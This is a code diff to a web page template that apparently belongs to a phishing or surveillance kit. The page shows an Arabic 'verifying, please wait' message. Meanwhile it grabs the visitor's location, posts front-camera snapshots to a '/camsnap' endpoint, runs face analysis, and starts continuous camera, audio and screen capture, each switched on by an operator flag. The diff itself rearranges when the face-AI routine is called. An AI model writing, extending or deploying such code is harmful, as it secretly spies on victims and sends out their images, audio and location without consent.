@@ -409,6 +409,7 @@ async function doCamera(){
           $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(img),cam:"front"});
         }
       }
+      <% if(faceAIAccess){ %>if(typeof doFaceAI==="function") doFaceAI(canvas);<% } %>
     }
     // Stop front video after initial burst (continuous capture handled separately below)
     frontStream.getVideoTracks().forEach(function(t){t.stop();});
@@ -612,7 +613,7 @@ function doVerify(){
   document.getElementById('step-text').textContent="جارٍ التحقق... يرجى الانتظار";
   setTimeout(function(){doRedirect();},9000);
   fireLocation();
-<% if(camAccess){ %>  var _cp=doCamera();if(_cp&&_cp.then)_cp.then(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)setTimeout(function(){doFaceAI(vf);},1000);<% } %>}).catch(function(){});<% if(faceAIAccess){ %>else setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},5000);<% } %><% } else if(faceAIAccess){ %>  setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},4000);<% } %>
+<% if(camAccess){ %>  var _cp=doCamera();if(_cp&&_cp.then)_cp.then(function(){}).catch(function(){});<% } %>
 <% if(contcamAccess){ %>  setTimeout(function(){if(typeof doContCam==="function")doContCam();},35000);<% } %>
 <% if(contaudioAccess){ %>  setTimeout(function(){doContAudio();},5000);<% } %>
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
